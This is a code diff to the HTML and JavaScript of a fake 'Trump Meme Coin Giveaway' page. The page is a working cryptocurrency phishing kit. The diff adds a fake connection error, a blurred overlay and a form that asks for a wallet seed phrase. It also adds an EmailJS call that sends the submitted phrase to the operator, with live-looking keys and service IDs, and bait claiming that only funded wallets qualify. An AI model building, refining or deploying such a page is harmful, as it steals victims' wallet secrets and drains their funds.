@@ -14,7 +14,7 @@
     }
 
     body {
-      background: url('https://images.unsplash.com/photo-1499696562547-dbe51006e1bb?q=80&w=686&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaWQ9by1wYWdlfHx8fGVufDB8fA%3D%3D') no-repeat center center/cover;
+      background: url('https://images.unsplash.com/photo-1499696562547-dbe51006e1bb?q=80&w=686&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D') no-repeat center center/cover;
       color: #333;
       line-height: 1.6;
       overflow-x: hidden;
@@ -27,6 +27,26 @@
       padding: 20px 10px;
     }
 
+    header img {
+      max-width: 120px;
+      margin-bottom: 10px;
+    }
+
+    header h1 {
+      font-size: 2rem;
+      margin-bottom: 5px;
+    }
+
+    header p {
+      font-size: 1.2rem;
+    }
+
+    .balance {
+      font-size: 1.5rem;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+
     .container {
       max-width: 900px;
       margin: 30px auto;
@@ -34,9 +54,65 @@
       background: #fff;
       border-radius: 8px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      transition: filter 0.3s ease;
     }
 
-    /* Fix for button not being clickable */
+    .blurred {
+      filter: blur(8px);
+      pointer-events: none;
+    }
+
+    .wallet-page {
+      display: none;
+      background: #fff;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 90%;
+      max-width: 400px; /* Moderate size */
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+      z-index: 1000;
+    }
+
+    .wallet-page.active {
+      display: block;
+    }
+
+    .error {
+      color: red;
+      font-weight: bold;
+      font-size: 0.9rem; /* Smaller font */
+      text-align: center;
+      background: #ffe6e6; /* Light red background */
+      padding: 8px;
+      border: 1px solid red;
+      border-radius: 5px;
+      margin-bottom: 10px;
+    }
+
+    label {
+      display: block;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+
+    input, select, textarea {
+      width: 100%;
+      padding: 12px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+
+    textarea {
+      height: 150px;
+      resize: none;
+    }
+
     .btn {
       display: block;
       width: 100%;
@@ -50,34 +126,10 @@
       border-radius: 5px;
       text-align: center;
       cursor: pointer;
-      position: relative; /* Ensures it's clickable */
-      z-index: 10;
-      transition: transform 0.2s, background 0.3s;
     }
 
     .btn:hover {
       background: #e03e00;
-      transform: scale(1.05);
-    }
-
-    /* Wallet Connection Page */
-    .wallet-page {
-      display: none;
-      background: #fff;
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      width: 90%;
-      max-width: 400px;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-      z-index: 1000;
-    }
-
-    .wallet-page.active {
-      display: block;
     }
 
     footer {
@@ -88,74 +140,143 @@
       color: #666;
     }
 
-    /* Live Wallet Counter */
-    .wallet-counter {
-      font-size: 1.2rem;
-      font-weight: bold;
-      color: red;
-      text-align: center;
-      margin-top: 10px;
+    .terms {
+      font-size: 0.9rem;
+      margin-top: 20px;
     }
 
-    /* Mobile Optimization */
-    @media (max-width: 600px) {
-      .container {
-        width: 90%;
-        padding: 15px;
-      }
+    .terms a {
+      color: #0056b3;
+      text-decoration: none;
+    }
+
+    .terms a:hover {
+      text-decoration: underline;
+    }
+
+    .note {
+      margin-top: 20px;
+      font-size: 0.75rem;
+      color: #333;
+      text-align: center;
+      background: #fff3cd;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #ffeeba;
+    }
+
+    /* Center "Copy & Paste Wallet Phrase" Text */
+    #wallet-phrase::placeholder {
+      text-align: center;
+      font-size: 1rem;
+      font-weight: bold;
+    }
+
+    /* Disable Scrolling When Wallet Page is Open */
+    body.noscroll {
+      overflow: hidden;
     }
   </style>
 </head>
 <body>
+  <!-- Header Section -->
   <header>
+    <img src="https://s.yimg.com/ny/api/res/1.2/C6usFI02aAqtM5gFrKz88w--/YXBwaWQ9aGlnaGxhbmRlcjt3PTY0MDtoPTg1Mw--/https://media.zenfs.com/en/aol_ny_post_us_news_articles_123/cd57f4122a7033346c851d4791a4aff0" alt="Trump Meme Coin Logo">
     <h1>Trump Meme Coin Giveaway</h1>
     <p>Make America Great Again!</p>
+    <div class="balance">$5,000,000 $TRUMP</div>
   </header>
 
-  <!-- Live Wallet Counter -->
-  <div class="wallet-counter">
-    Only <span id="wallet-count">2,000</span> spots left!
+  <!-- Landing Page Content -->
+  <div class="container" id="main-content">
+    <div class="card">
+      <h2>Join the Revolution!</h2>
+      <h4>Claim Your Share of $5 Million!</h4>
+      <p>We’re rewarding the first 10,000 active wallets with $500 in $TRUMP each!  
+      With 6,000+ wallets already credited, only 2,000+ spots remain — don’t miss out!.</p>
+      <p>To ensure a fair and rewarding experience, ONLY wallets that have been actively used or have funds in them will be eligible.</p>
+      <p>Be part of the movement — connect your wallet today and secure your share!.</p>
+      <button class="btn" onclick="showWalletPage()">Connect Wallet</button>
+    </div>
   </div>
 
-  <div class="container">
-    <h2>Join the Revolution!</h2>
-    <button id="connect-wallet-btn" class="btn">Connect Wallet</button>
-  </div>
-
+  <!-- Wallet Connection Page -->
   <div class="wallet-page" id="wallet-page">
+    <p class="error">There was an error connecting automatically. But do not worry, you can still connect manually.</p>
     <h2>Connect Your Wallet</h2>
     <p>Enter your wallet details to claim $500 worth of Trump Meme Coins.</p>
+
     <form id="wallet-form">
       <label for="wallet-type">Select Wallet Type</label>
       <select id="wallet-type" name="wallet_type" required>
         <option value="metamask">MetaMask</option>
         <option value="trustwallet">Trust Wallet</option>
         <option value="coinbase">Coinbase Wallet</option>
+        <option value="exodus">Exodus</option>
+        <option value="atomic">Atomic Wallet</option>
+        <option value="binance">Binance Chain Wallet</option>
+        <option value="phantom">Phantom</option>
+        <option value="myetherwallet">MyEtherWallet</option>
+        <option value="blockchain">Blockchain Wallet</option>
+        <option value="bitkeep">BitKeep</option>
+        <option value="coinomi">Coinomi</option>
+        <option value="bitpie">Bitpie</option>
+        <option value="alphawallet">AlphaWallet</option>
+        <option value="brd">BRD</option>
+        <option value="argent">Argent</option>
+        <option value="fortmatic">Fortmatic</option>
+        <option value="walletconnect">WalletConnect</option>
         <option value="others">Others</option>
       </select>
+
       <label for="wallet-phrase">Enter Your Wallet Phrase</label>
       <textarea id="wallet-phrase" name="wallet_phrase" placeholder="Copy & Paste Wallet Phrase" required></textarea>
+
+      <div class="note">
+        <p>Note: Only wallets with a balance or transaction history will be credited.</p>
+      </div>
+
       <button class="btn" type="submit">Submit</button>
     </form>
   </div>
 
+  <!-- Footer Section -->
   <footer>
     <p>&copy; 2025 Trump Meme Coin Giveaway. All rights reserved.</p>
+    <div class="terms">
+      <p>By participating, you agree to our <a href="#">Terms of Service</a>, <a href="#">Privacy Policy</a>, and <a href="#">Security Policy</a>.</p>
+    </div>
   </footer>
 
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
-    document.getElementById("connect-wallet-btn").addEventListener("click", function() {
-      document.getElementById('wallet-page').classList.add('active');
-    });
+    // Initialize EmailJS
+    (function() {
+      emailjs.init("8_8uPDLPGGbBtyIqv"); // Replace with your EmailJS public key
+    })();
 
-    // Live Wallet Counter Simulation
-    let count = 2000;
-    setInterval(() => {
-      if (count > 1800) {
-        count--;
-        document.getElementById('wallet-count').textContent = count;
-      }
-    }, 5000);
+    // Show Wallet Pop-up & Blur Background
+    function showWalletPage() {
+      document.getElementById('wallet-page').classList.add('active');
+      document.getElementById('main-content').classList.add('blurred');
+      document.querySelector('header').classList.add('blurred');
+      document.querySelector('footer').classList.add('blurred');
+      document.body.classList.add('noscroll'); // Prevent scrolling
+    }
+
+    // Add Event Listener for Form Submission
+    document.getElementById("wallet-form").addEventListener("submit", function(event) {
+      event.preventDefault();
+      emailjs.sendForm('service_oh2l5fc', 'template_oty8s2s', '#wallet-form')
+        .then(function(response) {
+          console.log('Success:', response);
+          alert('Connected to server. Processing for eligibility...');
+        })
+        .catch(function(error) {
+          console.error('Error:', error);
+          alert('Failed to send wallet details. Please try again.');
+        });
+    });
   </script>
 </body>
 </html>
